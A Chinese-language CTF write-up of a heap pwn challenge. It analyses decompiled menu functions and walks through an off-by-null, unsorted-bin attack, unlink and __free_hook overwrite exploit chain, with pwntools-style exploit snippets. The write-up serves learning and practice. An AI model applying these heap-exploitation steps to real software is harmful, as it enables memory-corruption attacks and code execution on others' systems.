前言

国赛线下做到一道题目质量还不错的堆利用的 pwn 题，考察到了很多知识点，也包含了几处绕过的思想。所以把题目和大家分享一个，刚好也做为我这种菜鸡的入门题目来练习。

题目描述

依旧是典型的菜单式选项

malloc函数

建立最大索引数为 32 的菜单，heap 的地址和大小 (len) 都会放在 bss 段上。

这里而且对 malloc 的 size 做了限制，限制大小在 127 到 256 之内，也就是只能申请到 smallbin 大小范围内的堆块。所以这里针对与 fastbin 的攻击就不奏效了。

unsigned __int64 ma(){  int v0; // ST04_4  int v1; // ST00_4  __int64 v3; // [rsp+0h] [rbp-10h]  unsigned __int64 v4; // [rsp+8h] [rbp-8h]
  v4 = __readfsqword(0x28u);  puts("index:");  LODWORD(v3) = read_int("index:");  if ( (signed int)v3 < 0 || (signed int)v3 > 32 || heap[(signed int)v3] )    exit(0);  puts("size:");  HIDWORD(v3) = read_int("size:");  if ( SHIDWORD(v3) <= 127 || SHIDWORD(v3) > 256 )    exit(0);  heap[(signed int)v3] = malloc(SHIDWORD(v3));  len[(signed int)v3] = HIDWORD(v3);  printf("gift: %llx\n", heap[(signed int)v3], v3);  puts("content:");  read(0, heap[v1], v0);  return __readfsqword(0x28u) ^ v4;}

  • 仔细看函数的逻辑：在获取输入内容到堆中的时候直接使用的是 read 函数，也没有使用 \x00 来进行截断，所以这里在 free 一个 smallbin 后重新 malloc 之后存在信息泄露。

free函数

free 函数没问题，不存在 uaf 和 double free 漏洞。

unsigned __int64 fr(){  signed int v1; // [rsp+4h] [rbp-Ch]  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
  v2 = __readfsqword(0x28u);  puts("index:");  v1 = read_int("index:");  if ( v1 < 0 || v1 > 32 || !heap[v1] )    exit(0);  free(heap[v1]);  heap[v1] = 0LL;  len[v1] = 0;  return __readfsqword(0x28u) ^ v2;}

edit函数

这个函数就比较有趣了。有两个需要注意到的点：

1.在 edit 函数存在一个很明显的 offbynull 漏洞，v0[read(0, heap[v2], (signed int)len[v2])] = 0;，所以可以优先考虑 offbynull 漏洞的利用。

利用方法参考 ctf-wiki，其中在 "off-by-one 利用思路" 一节中讲到，容易考虑使用 unlink 来达到任意地址写的目的。

2 . 在进行堆块内容的编辑操作时，会先进行检查是否 key1 （位于 bss 段中）等于 2，并且在编辑完一次之后 key1 会自加 1，所以也就是说我们这里最多只能编辑两次堆块。

unsigned __int64 ed(){  _BYTE *v0; // ST10_8  signed int v2; // [rsp+Ch] [rbp-14h]  unsigned __int64 v3; // [rsp+18h] [rbp-8h]
  v3 = __readfsqword(0x28u);  if ( key1 == 2 )    exit(0);  puts("index:");  v2 = read_int("index:");  if ( v2 < 0 || v2 > 32 || !heap[v2] )    exit(0);  puts("content:");  v0 = heap[v2];  v0[read(0, heap[v2], (signed int)len[v2])] = 0;  ++key1;  return __readfsqword(0x28u) ^ v3;}

show函数

show 函数也用到了一个 bss 段上的变量 key2 ，只有当 key2 不为 0 时，才能够输出内容。很显然程序中开始的 key2 的初始值为 0。

unsigned __int64 sh(){  signed int v1; // [rsp+4h] [rbp-Ch]  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
  v2 = __readfsqword(0x28u);  if ( key2 )  {    puts("index:");    v1 = read_int("index:");    if ( v1 < 0 || v1 > 32 || !heap[v1] )      exit(0);    puts((const char *)heap[v1]);  }  else  {    puts("only admin can use");  }  return __readfsqword(0x28u) ^ v2;}

小总结

key1 和 key2 都是放在 bss 段上的，而且位置相邻、各占 4 字节。因为在 edit 和 show 时是作为限制条件用的，所以根据出题人的点就知道：我们需要篡改这两个变量的值，才能正常的构造整条利用链。

解题思路

整体的解题思路是：

  1. 通过 offbynull 来达到 chunk overlapping 的目的，进而控制指针

  2. unsorted attack 向 key1、key2 的位置写入一个大的值，就可以同时绕过 edit 函数和 show 函数的限制

  3. unlink 攻击，将指针伪造到 bss 段上的 heap 区域

  4. 绕过 full relro，将 malloc_hook 或者 free_hook one_gadget 覆盖为 system 函数的地址

offbynull 的利用思路

根据那个 offbynull 漏洞，可以想到将下一个 chunk 的 size 值的低字节覆盖为 \x00。所以下一个 size 的大小至少为 0x90（再加上头字段的大小 0x11 为 0x101），覆盖完之后就变为了 0x100，也就是伪造指示了前一个堆块为空闲状态。

chunk0 的地址在 malloc 时会输出该 chunk 的地址。

即此时的代码表示为：

chunk0_addr = malloc(1, 0x88, '\n')malloc(2, 0xf8, '\n')
edit(1, p64(chunk0_addr - 0x10) * 2 + 'a' * 0x70 + p64(0x90))

  • 这里需要注意一下，要使得上一个的 chunk 可以覆盖到下一个 chunk 的 prev_size 区域才能达到 offbynull 的目的，所以这里的 size 值就需要精心构造才行。

接下来的构造 unlink 的步骤应该就算是轻车熟路了，这里就大概讲一下。

按照下面这样填充之后，free(11) 后，就可以控制 heap 处的指针了。

fake_chunk_layout = [    0, 0x81,    elf.symbols['heap'] + 80 - 0x18, elf.symbols['heap'] + 80 - 0x10,]edit(10, flat(fake_chunk_layout).ljust(0x80, 'b') + p64(0x80))free(1)         // 触发 unlink

  • elf.symbols['heap'] + 80 是 chunk10 的地址。

  • 对 unlink 不太熟悉的可以看这篇文章，这里讲的挺到位的，操作步骤也很详细。

覆写hook表

这里就简单了，直接 edit 两次，将 __free_hook 改为 system 的地址即可。

edit(10, p64(libc_addr + libc.symbols['__free_hook']))edit(7, p64(libc_addr + libc.symbols['system']))free(0)
